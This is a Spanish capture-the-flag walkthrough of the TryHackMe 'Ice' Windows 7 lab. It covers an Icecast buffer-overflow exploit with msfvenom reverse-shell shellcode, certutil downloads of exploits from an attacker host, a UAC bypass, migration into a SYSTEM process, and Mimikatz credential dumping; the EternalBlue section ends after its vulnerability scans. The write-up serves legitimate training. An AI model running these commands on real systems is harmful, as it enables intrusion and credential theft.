Ice es una máquina Windows Easy de TryHackMe construida sobre un único host Windows 7 sin parchear, y es una de las mejores máquinas para guardar como referencia porque la *misma* máquina se puede rootear de tres formas completamente distintas. El servicio de entrada es un antiquísimo servidor de streaming **Icecast** vulnerable a **CVE-2004-1561**, y el host es un Windows 7 SP1 totalmente sin parchear con **SMBv1** expuesto — lo que además lo convierte en un objetivo de manual para **MS17-010 (EternalBlue)**.

Este writeup documenta a propósito las tres rutas **por separado y muy en detalle**, así que sirve también como comparativa entre un flujo manual y el framework:

- **Método 1 — Manual.** Generar shellcode con `msfvenom`, meterlo en un proof-of-concept en C, explotar el buffer overflow de Icecast a mano para una shell como `Dark`, y luego escalar con el exploit de kernel **MS14-040 (CVE-2014-1767)** hasta `SYSTEM`.
- **Método 2 — Metasploit (Icecast).** El mismo bug a través de `exploit/windows/http/icecast_header`, luego un bypass de UAC y una migración de token/proceso a `SYSTEM`, terminando con un volcado de credenciales con Mimikatz.
- **Método 3 — Metasploit (EternalBlue).** Un único disparo de `MS17-010` directo a `SYSTEM`, sin necesidad de foothold.

Cada comando de Metasploit de abajo está explicado línea a línea.

## Reconocimiento y Enumeración

### Escaneo de Puertos

Un escaneo TCP completo con detección de servicios y scripts por defecto. `-p-` escanea los 65.535 puertos, `-sCV` lanza los scripts NSE por defecto (`-sC`) más la detección de versiones (`-sV`), y `-Pn` salta el descubrimiento de host ya que el ICMP confirmó que está vivo.

```bash
sudo nmap -p- -sCV -Pn -n 10.130.128.206 -oN nmap
```

```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          Icecast streaming media server
49152-49184/tcp open  msrpc   Microsoft Windows RPC
```

```bash
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: Dark-PC
|_  Workgroup: WORKGROUP
| smb-security-mode:
|_  message_signing: disabled (dangerous, but default)
```

Dos datos de esta salida deciden toda la máquina:

- El puerto **8000** corre **Icecast**, un servidor de streaming de código abierto. La build de Windows está anclada en una versión afectada por **CVE-2004-1561** — un buffer overflow remoto en su manejo de cabeceras HTTP. Ese es nuestro foothold.
- El host es **Windows 7 Professional SP1 (build 7601)** con **445/SMB** abierto y **message signing deshabilitado**. Un Windows 7 sin parchear con SMBv1 es el objetivo canónico de **MS17-010 / EternalBlue**, que confirmaremos en el Método 3.

### Enumeración de SMB

Antes de tocar los exploits, un barrido rápido de SMB. `crackmapexec` hace fingerprint del servicio en una línea:

```bash
crackmapexec smb 10.130.128.206
```

```bash
SMB  10.130.128.206  445  DARK-PC  [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:DARK-PC) (domain:Dark-PC) (signing:False) (SMBv1:True)
```

Esa única línea confirma las dos cosas que EternalBlue necesita: **`signing:False`** y **`SMBv1:True`**. Listar recursos de forma anónima y mapear permisos con una sesión vacía (null), sin embargo, no da nada útil:

```bash
smbclient -L 10.130.128.206 -N
# Anonymous login successful — pero no devuelve ningún recurso

smbmap -H 10.130.128.206 -u '' -p ''
# [!] Access denied on 10.130.128.206, no fun for you...
```

Así que SMB solo filtra el hostname (**DARK-PC**) y el dato de SMBv1. No hay recursos legibles ni credenciales que encontrar aquí — la entrada es Icecast, y SMB vuelve a ser relevante solo como la vía directa de EternalBlue. Con eso, el reconocimiento se divide en las tres rutas de abajo.

## Método 1 — Explotación Manual (Icecast + MS14-040)

La primera ruta no usa ningún framework de explotación: un proof-of-concept público en C para **CVE-2004-1561**, alimentado con shellcode que generamos nosotros mismos.

El PoC usado aquí es [el repo CVE-2004-1561 de Danyw24](https://github.com/Danyw24/CVE-2004-1561-Icecast-Header-Overwrite-buffer-overflow-RCE-2.0.1-Win32-), que trae una versión en Python y otra en C — cogemos la de C (`568-edit.c`, una copia editada del Exploit-DB 568). El exploit envía una petición Icecast malformada que desborda un buffer de cabecera y redirige la ejecución hacia un bloque de shellcode que embebemos en el código. Así que el primer trabajo es producir ese shellcode.

### Construir el shellcode con msfvenom

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
  LHOST=<ATTACKER_IP> LPORT=443 -b '\x0a\x0d\x00' -f c
```

Cada flag importa aquí:

- **`-a x86`** — la arquitectura objetivo. El proceso de Icecast es de 32 bits, así que el shellcode debe ser x86.
- **`--platform Windows`** — el SO en el que corre el payload.
- **`-p windows/shell_reverse_tcp`** — el payload: una reverse shell simple (no staged) que conecta de vuelta hacia nosotros. Se usa una shell plana de `cmd.exe` en vez de Meterpreter porque la vamos a recibir con un simple listener de `netcat`, no con un handler de Metasploit.
- **`LHOST` / `LPORT`** — nuestra IP y el puerto en el que escucharemos (443).
- **`-b '\x0a\x0d\x00'`** — los **bad characters** a evitar. El shellcode viaja dentro de una cadena de cabecera estilo HTTP, y esos bytes son el salto de línea (`\n`), el retorno de carro (`\r`) y el byte nulo — cualquiera de ellos truncaría o corrompería la petición antes de que llegue al buffer vulnerable. `msfvenom` tiene que codificar el payload para que ninguno de estos bytes aparezca en la salida.
- **`-f c`** — el formato de salida: un array `unsigned char buf[]` de C, listo para pegar directamente en el código del exploit.

Por la restricción de bad chars, `msfvenom` pasa automáticamente el payload por el encoder polimórfico **`x86/shikata_ga_nai`**, que lo reescribe en un flujo de bytes equivalente libre de `\x0a`, `\x0d` y `\x00`:

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] =
"\xbf\xcd\x34\x8e\x1b\xd9\xc1\xd9\x74\x24\xf4\x5e\x33\xc9"
"\xb1\x52\x83\xee\xfc\x31\x7e\x0e\x03\xb3\x3a\x6c\xee\xb7"
... (recortado) ...
"\x5c\xfc\xb7\x48\x59\xb8\x7f\xa1\x13\xd1\x15\xc5\x80\xd2\x3f";
```

### Parchear y compilar el exploit

Pega ese array `buf[]` sobre el shellcode de relleno dentro de `568-edit.c`, y luego compílalo con `gcc`:

```bash
gcc 568-edit.c -o exploit
```

Ejecutarlo apunta el exploit al puerto Icecast del objetivo y dispara la petición malformada. El PoC comprueba la respuesta primero, informa de que el servicio es vulnerable, y luego envía el overflow:

```bash
./exploit 10.130.128.206
```

```bash
Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
shellcode add-on by Delikon

- target 10.130.128.206:8000
- send malformed data

Server IS vulnerable!!!
```

### Recibir la shell como Dark

Con un listener ya esperando en el puerto 443, el shellcode conecta de vuelta. `rlwrap` envuelve a `netcat` para que la shell cruda de Windows tenga historial de comandos y edición de línea (flechas, retroceso) — una gran mejora de comodidad en una shell de `cmd.exe`:

```bash
sudo rlwrap nc -nlvp 443
```

```bash
Listening on 0.0.0.0 443
Connection received on 10.130.128.206 49291
Microsoft Windows [Version 6.1.7601]

C:\Program Files (x86)\Icecast2 Win32> whoami /all
```

```bash
User Name    SID
============ ==============================================
dark-pc\dark S-1-5-21-2096091615-1365079743-3039020981-1000

Mandatory Label\Medium Mandatory Level  Label  S-1-16-8192

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled

```

Caemos como **`dark-pc\dark`** a integridad **Media**, con el token sin privilegios por defecto — sin `SeImpersonate`, sin `SeDebug`, nada explotable en la lista de privilegios. Es una shell de usuario normal, así que el siguiente paso es la escalada de privilegios local.

### Enumeración local con winPEAS

El objetivo no tiene herramientas de salida, así que servimos winPEAS desde un servidor web de Python en nuestra máquina y lo bajamos con `certutil`, un binario firmado de Windows que también funciona como descargador de ficheros (`-urlcache -split -f` fuerza una descarga fresca y completa):

```bash
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/winPEAS.exe
winPEAS.exe
```

winPEAS no saca nada decisivo — ninguna mala configuración de servicio obvia, ninguna credencial guardada, ningún permiso de fichero débil. Esa es la señal para volver a la propia plataforma: es un Windows 7 viejo y sin parchear, así que un **exploit de kernel** es la vía fiable.

### Escalada de Privilegios — MS14-040 (CVE-2014-1767) → SYSTEM

**MS14-040** es una vulnerabilidad de doble liberación (double-free) en `afd.sys` (el Ancillary Function Driver de Winsock). En un Windows 7 SP1 sin parchear permite a un usuario local sin privilegios corromper memoria del kernel y ejecutar código como `NT AUTHORITY\SYSTEM`. El parche que lo arregla es **KB2961072**, así que la forma más rápida de confirmar que la máquina es vulnerable es listar los hotfixes instalados y comprobar si ese KB (o cualquier rollup posterior a julio de 2014) está presente:

```bash
wmic qfe get HotFixID | findstr "KB2961072"
# (sin salida — el parche no está instalado)

wmic qfe get HotFixID
```

```bash
HotFixID
KB2534111
KB976902
```

Solo hay dos hotfixes antiguos instalados y **KB2961072 está ausente**, así que `afd.sys` está sin parchear y el double-free es explotable. Hay un exploit precompilado disponible en la colección [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-040) de SecWiki; lo descargamos con `certutil` y lo ejecutamos:

```bash
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/MS14-040-x64.exe
MS14-040-x64.exe
```

```bash
c:\Windows\System32> whoami
nt authority\system
```

Eso es `SYSTEM` completo en la máquina, alcanzado enteramente a mano. Ruta uno completa.

## Método 2 — Metasploit (Icecast + Bypass de UAC)

La segunda ruta explota el **mismo bug de Icecast**, pero a través de Metasploit — y luego toma una vía de escalada completamente distinta (un bypass de UAC más una migración de proceso) para mostrar cómo el framework encadena la post-explotación.

### Lanzar el framework y un workspace

```bash
msfconsole
```

```bash
msf > workspace --add Ice
[*] Added workspace: Ice
```

**`workspace --add Ice`** crea y cambia a un workspace con nombre. Los workspaces son la forma que tiene Metasploit de mantener los hosts, servicios y loot de un engagement aislados en su base de datos, para que las notas de esta máquina nunca se mezclen con las de otra.

### Foothold: exploit/windows/http/icecast_header

```bash
msf > search icecast
```

```bash
#  Name                                 Disclosure Date  Rank   Check  Description
-  ----                                 ---------------  ----   -----  -----------
0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
```

- **`search icecast`** consulta la base de datos de módulos por cualquier cosa que coincida con el nombre del servicio. Vuelve un módulo — el mismísimo header overwrite de CVE-2004-1561 que explotamos a mano.

```bash
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

- **`use 0`** selecciona ese módulo por su índice de búsqueda (equivale a `use exploit/windows/http/icecast_header`). Metasploit auto-selecciona un payload por defecto sensato, `windows/meterpreter/reverse_tcp` — una shell Meterpreter staged, que es por lo que esta ruta no necesita `msfvenom`.

```bash
msf exploit(windows/http/icecast_header) > show options
```

- **`show options`** lista todos los ajustes que requieren el módulo y su payload. Aquí `RHOSTS` (el objetivo) y `RPORT 8000` ya son correctos para el módulo; solo necesitamos poner los datos de nuestro listener.

```bash
msf exploit(...) > set RHOSTS 10.130.128.206
msf exploit(...) > set LHOST <ATTACKER_IP>
msf exploit(...) > exploit
```

- **`set RHOSTS` / `set LHOST`** — la IP del objetivo y *nuestra* IP (adonde conecta de vuelta Meterpreter).
- **`exploit`** — envía las cabeceras Icecast maliciosas y arranca el handler de reverse-TCP en un solo paso.

```bash
[*] Started reverse TCP handler on <ATTACKER_IP>:4444
[*] Sending stage (196678 bytes) to 10.130.128.206
[*] Meterpreter session 2 opened (<ATTACKER_IP>:4444 -> 10.130.128.206:49269)

meterpreter > getuid
Server username: Dark-PC\Dark
```

Una rápida orientación de post-explotación:

```bash
meterpreter > sysinfo        # SO, build, arquitectura, dominio
meterpreter > getuid         # quiénes somos: Dark-PC\Dark
meterpreter > getprivs       # los privilegios de nuestro token (limitados — igual que el Método 1)
```

- **`sysinfo`** imprime el SO/build/arquitectura — Windows 7 x64, Meterpreter x86.
- **`getuid`** confirma que somos otra vez el `Dark-PC\Dark` sin privilegios.
- **`getprivs`** lista los privilegios del token; como en el Método 1 es el conjunto pelado sin privilegios, así que necesitamos escalar.

### Encontrar una escalada local con el suggester

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

```bash
[*] 10.130.128.206 - Collecting local exploits for x86/windows...
    exploit/windows/local/bypassuac_eventvwr
```

- **`run post/multi/recon/local_exploit_suggester`** ejecuta un módulo post que comprueba la sesión contra los exploits locales de Metasploit e informa de cuáles es probable que funcionen. Marca **`bypassuac_eventvwr`** — un bypass de UAC. Eso importa porque `Dark` es miembro del grupo local de Administradores, pero bajo el **Control de Cuentas de Usuario (UAC)** el token se filtra a un token de usuario estándar; un bypass de UAC nos devuelve el token *completo* de administrador sin un prompt de contraseña.

```bash
meterpreter > background
```

- **`background`** desacopla la sesión Meterpreter actual (manteniéndola viva como sesión 2) y vuelve al prompt `msf >`, para poder cargar otro módulo contra ella.

### Bypass de UAC: exploit/windows/local/bypassuac_eventvwr

```bash
msf > use exploit/windows/local/bypassuac_eventvwr
msf exploit(...) > set session 2
msf exploit(...) > exploit
```

- **`use exploit/windows/local/bypassuac_eventvwr`** selecciona el módulo de bypass de UAC. Abusa de `eventvwr.exe`, un binario firmado por Microsoft que auto-eleva: lee un comando de la clave de registro `HKCU\Software\Classes\mscfile\shell\open\command`, que un usuario normal puede escribir. El módulo planta nuestro payload ahí, lanza `eventvwr.exe`, y Windows ejecuta el payload a **alta integridad** sin preguntar.
- **`set session 2`** le dice al módulo a través de qué sesión Meterpreter existente escalar.
- **`exploit`** realiza el bypass y abre una nueva sesión elevada:

```bash
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[*] Meterpreter session 3 opened (<ATTACKER_IP>:4444 -> 10.130.128.206:49316)

meterpreter > getuid
Server username: Dark-PC\Dark
```

`getuid` sigue diciendo `Dark-PC\Dark` — pero la diferencia es el **token**. `getprivs` ahora devuelve el conjunto *completo* de privilegios de administrador que antes estaba filtrado:

```bash
meterpreter > getprivs
```

```bash
SeBackupPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege   # el importante
... (conjunto completo de admin) ...
```

Con **`SeDebugPrivilege`** en mano, podemos abrir e inyectar en cualquier proceso del sistema — incluido uno que ya corra como `SYSTEM`.

### Migrar a un proceso de SYSTEM

```bash
meterpreter > ps
```

```bash
 PID   PPID  Name          Arch  Session  User
 ---   ----  ----          ----  -------  ----
 1376  692   spoolsv.exe   x64   0        NT AUTHORITY\SYSTEM   # el objetivo
 1320  1296  explorer.exe  x64   1        Dark-PC\Dark
```

- **`ps`** lista los procesos en ejecución con sus propietarios. `spoolsv.exe` (el spooler de impresión, PID 1376) corre como `NT AUTHORITY\SYSTEM` — un objetivo de migración perfecto.

```bash
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 3124 to 1376...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

- **`migrate -N spoolsv.exe`** inyecta nuestro Meterpreter en el proceso *por nombre* (`-N`) y traslada la ejecución allí. Como `SeDebugPrivilege` nos deja abrir el proceso propiedad de SYSTEM, Meterpreter hereda su token — y `getuid` ahora devuelve **`NT AUTHORITY\SYSTEM`**. Migrar también hace la sesión más estable, ya que deja de depender de que el proceso de Icecast siga vivo.

### Volcar credenciales con Kiwi (Mimikatz)

Ya como SYSTEM, podemos leer secretos directamente de la memoria:

```bash
meterpreter > load kiwi
meterpreter > creds_all
```

- **`load kiwi`** carga la extensión Kiwi — la build de **Mimikatz** para Meterpreter.
- **`creds_all`** parsea cada proveedor de credenciales en la memoria de LSASS (msv, wdigest, tspkg, kerberos) e imprime lo que encuentra:

```bash
msv:
Username  Domain   NTLM
--------  ------   ----
Dark      Dark-PC  7c4fe5eada682714a036e39378362bab

wdigest / tspkg / kerberos:
Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!
```

En Windows 7, WDigest guarda la contraseña en texto claro en memoria, así que Kiwi recupera **`Dark : Password01!`** directamente, junto al hash NTLM. Por último, `hashdump` lee la base de datos local SAM para sacar el hash NTLM de cada cuenta:

```bash
meterpreter > hashdump
```

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Esos hashes se podrían crackear offline o reutilizar directamente en un ataque de **pass-the-hash**. Ruta dos completa.

## Método 3 — Metasploit (EternalBlue / MS17-010)

La tercera ruta ignora Icecast por completo. Como el host es un Windows 7 SP1 sin parchear con SMBv1, es vulnerable a **MS17-010 (EternalBlue)** — un bug de corrupción de pool en el driver de SMBv1 (`srv.sys`) que da ejecución de código como `SYSTEM` directamente, sin una shell de usuario de por medio. Esta es la vía más corta de toda la máquina.

### Confirmar SMB y la vulnerabilidad

```bash
msf > search type:auxiliary smb
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > setg RHOSTS 10.130.128.206
msf auxiliary(scanner/smb/smb_version) > run
```

- **`search type:auxiliary smb`** filtra la búsqueda de módulos a los *auxiliary* (scanners, no exploits) relacionados con SMB.
- **`use auxiliary/scanner/smb/smb_version`** selecciona el scanner de detección de versión de SMB.
- **`setg RHOSTS 10.130.128.206`** pone el objetivo de forma **global** (`setg` en vez de `set`), para que todos los módulos que carguemos después lo hereden y no tengamos que reescribirlo.
- **`run`** ejecuta el scanner:

```bash
[*] 10.130.128.206:445 - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional)
[+] 10.130.128.206:445 -   Host is running Windows 7 Professional SP1 (build:7601)
```

SMBv1 está presente — la precondición para EternalBlue. Ahora el check dedicado de MS17-010:

```bash
msf auxiliary(scanner/smb/smb_version) > search ms17_010
msf auxiliary(...) > use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary(scanner/smb/smb_ms17_010) > run
```

```bash
[+] 10.130.128.206:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
```

## Conclusiones Clave

- **Un host, tres caminos a SYSTEM.** Ice es la ilustración más clara de que una máquina es solo tan segura como su exposición más débil: un servicio antiguo (Icecast), un parche de kernel que falta (MS14-040) y un stack SMBv1 sin parchear (MS17-010) son cada uno, por separado, game over. La gestión de parches no es opcional en ninguno de ellos.
- **La explotación manual y con framework son la misma idea a distinta altitud.** El Método 1 y el Método 2 explotan el *mismo* bug CVE-2004-1561 — uno generando shellcode con `msfvenom` y compilando un PoC a mano, el otro con un único comando `exploit`. Hacerlo manualmente una vez es lo que hace legible el framework: sabes lo que el módulo está enviando de verdad.
- **Los bad characters guían la codificación del shellcode.** La restricción `-b '\x0a\x0d\x00'` es la razón por la que `msfvenom` recurrió a `shikata_ga_nai`. Cuando un payload se entrega dentro de un protocolo de texto, los bytes nulos y CR/LF rompen el buffer, y el encoder existe precisamente para eliminarlos.
- **UAC no es una frontera de privilegios.** `Dark` ya era administrador; UAC solo *filtraba* el token. `bypassuac_eventvwr` restauró el token completo de admin sin ningún prompt, tras lo cual `SeDebugPrivilege` + una migración a un proceso de SYSTEM fue todo lo que hizo falta para ser SYSTEM.
- **En Windows antiguo, las credenciales en claro están en memoria.** WDigest en Windows 7 mantuvo la contraseña de `Dark` recuperable en texto plano a través de Mimikatz, y el SAM entregó cada hash NTLM para reutilizarlo. Llegar a SYSTEM rara vez es el final — es el comienzo de la recolección de credenciales y el movimiento lateral.
